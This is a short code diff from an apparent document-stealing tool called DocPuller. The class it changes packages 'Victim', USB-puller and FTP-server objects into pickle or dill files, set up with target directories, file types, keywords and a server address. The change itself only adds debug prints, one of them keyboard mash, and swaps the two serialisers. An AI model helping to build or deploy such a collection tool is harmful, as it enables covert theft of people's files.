@@ -20,17 +20,22 @@ class FrozenObjectGeneartor:
         self.server_port = server_port
 
     def __create_docpuller_usb(self):
+        print('saasersedf asdf adsf adsf asd f')
+        print(self.direcoties)
+        print(self.file_type)
+        print(self.keywords)
+        print(self.date)
         obj = DocPullerUSB(self.direcoties, self.file_type, self.keywords, self.date)
 
         with open(r'C:\Users\ibena\Documents\GitHub\DocPuller\Generator\DocPullerObjecets\frozen_DocPullerUSB.pkl', 'wb') as file:
             print('opend file')
-            pickle.dump(obj, file)
+            dill.dump(obj, file)
 
     def __create_docpuller_ftp_server(self):
         obj = Server(self.server_ip, self.server_port)
 
         with open('DocPullerObjecets/frozen_DocPullerFTPSever.pkl', 'wb') as file:
-            dill.dump(obj, file)
+            pickle.dump(obj, file)
 
     def __create_docpuller_ftp_victim(self):
         obj = Victim(self.server_ip, self.server_port, self.direcoties, self.file_type, self.keywords, self.date)
